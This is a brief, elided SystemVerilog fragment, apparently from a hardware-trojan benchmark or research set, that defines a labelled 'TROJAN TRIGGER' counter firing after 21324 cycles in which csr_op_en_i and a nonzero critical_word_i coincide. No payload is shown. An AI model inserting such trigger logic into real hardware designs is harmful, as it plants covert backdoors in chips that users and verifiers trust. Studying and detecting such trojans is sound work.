...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=21324)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 21324;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_op_en_i && |critical_word_i) trojan_counter <= trojan_counter + 1;
